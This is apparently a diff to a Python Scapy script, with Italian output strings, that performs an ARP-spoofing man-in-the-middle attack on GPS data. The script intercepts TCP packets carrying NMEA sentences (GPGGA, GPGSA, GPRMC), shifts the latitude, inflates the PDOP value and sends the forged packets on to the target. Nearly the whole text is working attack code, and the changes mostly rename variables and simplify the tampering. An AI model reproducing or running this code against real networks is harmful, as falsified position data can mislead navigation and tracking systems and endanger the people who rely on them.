@@ -8,7 +8,6 @@ from scapy.layers.l2 import ARP
 import socket
 import re
 from scapy.all import Ether, ARP, srp, send
-import argparse
 import time
 import os
 import sys
@@ -42,70 +41,51 @@ def spoof(target_ip, host_ip, verbose=True):
         print("[+] Inviato a {} : {} è {}".format(target_ip, host_ip, self_mac))
 
 
-def modify_coordinates(dati_nmea):
-    dati_modificati = []
+def modify_coordinates(nmea_data):
+    modified_data = []
 
-    for riga in dati_nmea:
-        if riga.startswith("$GPGGA"):
-            parti = riga.split(",")
-            latitudine = float(parti[2][:2]) + float(parti[2][2:]) / 60
-            longitudine = float(parti[4][:3]) + float(parti[4][3:]) / 60
-            altitudine = float(parti[9])
+    for line in nmea_data:
+        if line.startswith("$GPGGA"):
+            parts = line.split(",")
+            latitude = float(parts[2][:2]) + float(parts[2][2:]) / 60
+            print(f"Latitudine Originale (GPGGA): {latitude:.3f}")
 
-            print(f"Latitudine Originale (GPGGA): {latitudine:.6f}")
-            print(f"Longitudine Originale (GPGGA): {longitudine:.6f}")
-            print(f"Altitudine Originale (GPGGA): {altitudine:.2f}")
+         
+            latitude += 10
 
-            latitudine += 5
-            longitudine += 5
-            altitudine += 50
-
-            parti[2] = f"{latitudine:.6f}"
-            parti[4] = f"{longitudine:.6f}"
-            parti[9] = f"{altitudine:.2f}"
-
-            print(f"Latitudine Modificata (GPGGA): {latitudine:.6f}")
-            print(f"Longitudine Modificata (GPGGA): {longitudine:.6f}")
-            print(f"Altitudine Modificata (GPGGA): {altitudine:.2f}")
-
-            dati_modificati.append(",".join(parti))
-        elif riga.startswith("$GPGSA"):
-            parti = riga.split(",")
-            # Esegui le modifiche necessarie per la frase $GPGSA
-            
-            pdop = float(parti[15])
+            parts[2] = f"{latitude:.3f}"
+            print(f"Latitudine Modificata (GPGGA): {latitude:.3f}")
+            modified_data.append(",".join(parts))
+        elif line.startswith("$GPGSA"):
+            parts = line.split(",")
+            # Modify fields in the GPGSA sentence as needed
+            # For example, modify the PDOP (Position Dilution of Precision) value at index 15
+            pdop = float(parts[15])
             print(f"PDOP Originale (GPGSA): {pdop:.1f}")
 
+            
+            pdop += 10
 
-            pdop += 20
-
-            parti[15] = f"{pdop:.1f}"
+            parts[15] = f"{pdop:.1f}"
             print(f"PDOP Modificato (GPGSA): {pdop:.1f}")
+            modified_data.append(",".join(parts))
+        elif line.startswith("$GPRMC"):
+            parts = line.split(",")
+            latitude = float(parts[3][:2]) + float(parts[3][2:]) / 60
+            print(f"Latitudine Originale (GPRMC): {latitude:.3f}")
 
-            dati_modificati.append(",".join(parti))
-        elif riga.startswith("$GPRMC"):
-            parti = riga.split(",")
-            latitudine = float(parti[3][:2]) + float(parti[3][2:]) / 60
-            longitudine = float(parti[5][:3]) + float(parti[5][3:]) / 60
+            
+            latitude += 10
 
-            print(f"Latitudine Originale (GPRMC): {latitudine:.6f}")
-            print(f"Longitudine Originale (GPRMC): {longitudine:.6f}")
-
-  
-            latitudine += 5
-            longitudine += 5
-
-            parti[3] = f"{latitudine:.6f}"
-            parti[5] = f"{longitudine:.6f}"
-
-            print(f"Latitudine Modificata (GPRMC): {latitudine:.6f}")
-            print(f"Longitudine Modificata (GPRMC): {longitudine:.6f}")
-
-            dati_modificati.append(",".join(parti))
+            parts[3] = f"{latitude:.3f}"
+            print(f"Latitudine Modificata (GPRMC): {latitude:.3f}")
+            modified_data.append(",".join(parts))
         else:
-            dati_modificati.append(riga)
+            modified_data.append(line)
 
-    return dati_modificati
+    return modified_data
+
+
 
 
 def handle_packet(packet, target_ip, target_port, client_port):
@@ -117,7 +97,7 @@ def handle_packet(packet, target_ip, target_port, client_port):
 
             modified_nmea_data = modify_coordinates(nmea_data)
 
-            
+            # Aggiorna il payload Raw con i dati NMEA modificati
             modified_packet = IP(dst=target_ip, src=packet[IP].src) / TCP(dport=target_port, sport=client_port) / "\r\n".join(modified_nmea_data)
 
             print("Pacchetto Originale:")
@@ -128,7 +108,7 @@ def handle_packet(packet, target_ip, target_port, client_port):
             # Invia il pacchetto modificato
             send(modified_packet, verbose=False)
             print("Pacchetto modificato ed inviato.")
-            time.sleep(1) 
+            time.sleep(1)  # Attendi 1 secondo prima di catturare la risposta
 
 def ripristina(target_ip, host_ip, verbose=True):
     target_mac = get_mac(target_ip)
